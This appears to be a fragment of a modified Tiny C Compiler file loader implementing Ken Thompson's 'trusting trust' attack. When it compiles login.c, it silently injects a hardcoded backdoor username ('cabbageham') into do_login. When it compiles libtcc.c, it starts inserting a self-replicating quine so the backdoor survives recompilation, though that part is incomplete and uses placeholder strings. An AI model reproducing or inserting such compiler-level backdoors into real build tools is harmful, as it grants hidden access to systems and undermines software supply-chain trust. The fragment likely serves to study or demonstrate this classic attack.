 if(!strcmp(str, "login.c")) {
        printf("testing\n");
        char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
        FILE *source = fopen(str, "r");
		FILE *temp = fopen("temp.txt", "w");
        char target_line[] = "static int do_login(const char *username){";
		char buffer[50000];
		while (fgets(buffer, 50000, source)) {
		    if (strstr(buffer, target_line)) {
		        fputs(buffer, temp);
                fputs(login_line, temp);
            } 
            else {
                fputs(buffer, temp);
            }
		}
		fclose(source);
		fclose(temp);
		fd = _tcc_open(s1, "temp.txt");
        str = "temp.txt";
	}

	if(!strcmp(str, "libtcc.c")) {
		FILE *source = fopen(str, "r");
		FILE *temp = fopen("temp.txt", "w");
        char target_line[] = "       variables, which may or may not have advantages */";
        char attack_line[] = "printf(\"THIS IS A TEST\\n\");";
    	char buffer[50000];
        char constructed_quine[5000];
		while (fgets(buffer, 50000, source)) {
		    if (strstr(buffer, target_line)) {
                //TODO reconstruct quine considering escape characters, insert into temp_buffer
                char temp_buffer[] = "hiiii";

                strcpy(constructed_quine, "char* quine = \"");
                strcat(constructed_quine, temp_buffer);
                strcat(constructed_quine, "\";\n");
		        fputs(constructed_quine, temp);

		        fputs(buffer, temp);
                fputs(quine, temp);                
            } 
            else {
                fputs(buffer, temp);
            }
        }
		fclose(source);
		fclose(temp);
		fd = _tcc_open(s1, "temp.txt");
        str = "temp.txt";
	}